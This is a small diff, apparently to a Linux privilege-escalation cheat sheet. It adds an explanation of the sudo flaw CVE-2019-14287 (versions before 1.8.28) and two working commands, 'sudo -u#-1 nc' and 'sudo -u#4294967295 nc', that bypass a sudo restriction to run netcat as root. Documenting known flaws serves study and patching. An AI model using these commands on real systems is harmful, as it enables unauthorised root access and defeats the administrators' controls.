@@ -195,5 +195,10 @@ $ sudo -l
 ```
 </div><div>
 
-...
+In sudo before 1.8.28 (CVE-2019-14287), if a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.
+
+```bash
+$ sudo -u#-1 nc
+$ sudo -u#4294967295 nc
+```
 </div></div>
